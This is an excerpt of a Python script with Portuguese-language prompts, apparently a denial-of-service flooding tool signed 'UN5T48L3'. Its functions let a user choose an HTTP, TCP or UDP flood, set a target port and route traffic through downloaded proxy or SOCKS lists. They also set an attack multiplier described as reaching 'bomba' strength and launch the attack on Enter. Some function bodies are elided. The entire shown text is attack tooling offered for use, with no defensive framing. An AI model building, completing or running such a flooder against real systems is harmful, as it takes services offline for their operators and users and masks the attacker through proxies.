...
def floodmode():
	global choice1
	choice1 = input("Você deseja executar a inundação HTTP '0' (melhor), a inundação TCP '1' ou a inundação UDP '2'?")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # C0d3d by UN5T48L3
				print("Você precisa executar este programa como root para usar a inundação TCP / UDP.") # C0d3d by UN5T48L3
...
def floodport():
	global port
	try:
		port = int(input("Digite a porta que você deseja inundar: "))
		...
		print ("Você digitou incorretamente, tente novamente.") # C0d3d by UN5T48L3
		floodport() # C0d3d by UN5T48L3
	proxymode()
...
def choiceproxysocks():
	global choice3
	choice3 = input("Digite '0' para habilitar o proxymode ou digite '1' para habilitar o socksmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("Você quer baixar uma nova lista de proxy? Responda 'y' para fazer isso: ")
	if choice4 == "y":
		choicemirror1()
	else:
		proxylist()
...
def choicedownsocks():
	choice4 = input("Quer baixar uma nova lista de meias? Responda 'y' para fazer isso: ")
	if choice4 == "y":
		choicemirror2()
	else:
		proxylist()
...
def multiplication():
	global multiple
	try:
		multiple = int(input("Insira um número de multiplicação para o ataque [(1-5 = normal) (50 = poderoso) (100 ou mais = bomba)]: "))
	except ValueError:
		print("Você digitou incorretamente, tente novamente.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("Pressione 'Enter' para iniciar o ataque: ")
	if choice6 == "":
		loop()
